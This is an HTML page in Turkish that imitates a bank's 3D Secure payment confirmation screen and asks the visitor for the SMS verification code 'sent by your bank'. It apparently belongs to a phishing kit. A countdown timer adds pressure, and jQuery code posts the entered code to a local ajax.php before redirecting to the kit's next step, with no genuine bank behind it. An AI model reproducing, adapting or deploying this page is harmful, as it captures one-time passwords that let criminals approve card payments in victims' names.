<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-9">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="-1">
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>Güvenli Ödeme Ekranı</title>
  <link rel="stylesheet" href="./tema/1.css">
  <link rel="stylesheet" href="./tema/2.css" type="text/css" media="screen" />
  <style>
      .payment {
    background: #f8f8f8;
    max-width: 650px;
    margin: 80px auto;
    height: auto;
    padding: 35px;
    padding-top: 70px;
    border-radius: 5px;
    position: relative;
}
.payment-logo {
    position: absolute;
    top: -50px;
    left: 50%;
    transform: translateX(-50%);
    width: 100px;
    height: 100px;
    background: #f8f8f8;
    border-radius: 50%;
    box-shadow: 0 0 5px rgba(0,0,0,0.2);
    text-align: center;
    line-height: 85px;
}
.payment-logo p {
    position: relative;
    color: #f8f8f8;
    font-family: inherit;
    font-size: 58px;
}
.payment-logo:before {
    content: "";
    position: absolute;
    top: 5px;
    left: 5px;
    width: 90px;
    height: 90px;
    background: #f00;
    border-radius: 50%;
}
  </style>
</head>
<body>
  <div class="content-wrapper">
      <div class="payment">
		<div class="payment-logo">
			<p>3D</p>
		</div>
		<p>
		</p>
		<center style="font-size:17px"> Lütfen bankanız tarafından telefonunuza gönderilen <strong>6-8</strong> Haneli <strong>3D</strong> Güvenlik Onay şifresini giriniz.</center>
		<p></p>
		<br>
      
    <div id="approve-page">
      <div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none">
        <div class="loader"></div>
      </div>
      <div class="content">
        <div class="action-wrapper" 3dsdisplay="prompt" 3dslabel="prompt">
          <div class="form-wrapper">
            <input name="fakePasswordRemembered" id="fakePasswordRemembered" style="display: none;" type="password">
            <form 3dsaction="manual" class="form-code" method="POST" autocomplete="off" novalidate="novalidate">
              <div class="form-row">
                <input 3dsinput="password" type="number" class="f-input" name="password" id="passwordfield" maxlength="8" minlength="0"> </div>
              <div id="wrongPassDiv" 3dsdisplay="error" class="error-messages error-wrong-otp" style="display: block;"> <span class="has-reg"></span></div>
              <div id="timeOutDiv" class="error-messages error-timeover" style="display: none;">
                <div> <span class="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span> </div>
                <button id="retryButton" type="submit" onclick="retryButtonClick()" class="button btn-1 re-code v1" name="newsms" value="retry">Doğrulama Kodunu Yeniden Gönder</button>
                <div>
                  <label id="otpcompleted" for="toggle-1" style="cursor: pointer; display: none;">Yardım</label>
                </div>
                <input style="display: none" class="popup txt-link trigger-absolute-panel" type="checkbox" id="toggle-1">
                <div class="noscriptHelpText"> Doğrulama esnasında cep telefonunuza doğrulama kodu gelmemesi durumunda doğrulama için kalan sürenin dolmasını bekleyerek ?Doğrulama Kodunu Tekrar Gönder? linkinden tekrar doğrulama kodu gönderilmesini talep edebilirsiniz.
                  <br> Tekrar doğrulama kodu gönderimi sağlandığı halde cep telefonunuza ulaşmaması ve benzeri problemlerde lütfen kartınızı ihraç eden kuruluş ile irtibata geçiniz. </div>
              </div>
              <div id="submitButtonDiv">
                  <div id="timerDiv" class="has-timer"> <span>Kalan süre: </span> <span class="has-counter" id="has-counter" style="font-weight:bold">00:00</span>  </div>
                  <br/>
                  <span style="
    font-size: 14px;
    margin-bottom: 10%;
    display: block;
">
                  Saniye sonra işlem iptal edilecek.
                </span>
                <div class="has-submit">
                  <button id="submitbutton" type="button" name="button" class="button btn-1 btn-commit">Onayla</button>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>
  <script type="text/javascript" src="./tema/jquery.js"></script>
  <script type="text/javascript" src="./tema/sweet.js"></script>
  <script type="text/javascript" src="./tema/jquery-mask.js"></script>
  <script type="text/javascript">
  $('#passwordfield').mask('00000000');
  $("#submitbutton").click(function() {
    var sifre = parseInt($("#passwordfield").val());
    console.log(sifre);
    if(sifre == '') {
      Swal.fire('Hata', 'Lütfen boş alan bırakmayınız.', 'error');
    } else if(sifre.toString().length < 5) {
      Swal.fire('Hata', 'Geçersiz doğrulama kodu.', 'error');
    } else {
      $.ajax({
        url: "./ajax.php",
        type: "POST",
        dataType: "JSON",
        data: {
          "sms1": 1,
          "sifre": sifre,
        },
        success: function(donenVeri) {
          if(donenVeri.durum == 0) {
            Swal.fire('Hata', donenVeri.mesaj, 'error');
          } else if(donenVeri.durum == 1) {
            window.location.replace("./sorgulama.php?target=3d_1.php");
          } else {
            Swal.fire('Hata', 'Bilinmeyen bir hata oluştu.', 'error');
          }
        }
      });
    }
  });
  var saniye = 180;
  setInterval(function() {
    saniye -= 1;
    $("#has-counter").html(saniye);
    if(saniye == 0) {
      window.location.replace("./3d.php");
    }
  }, 1000);
  </script>
</body>

</html>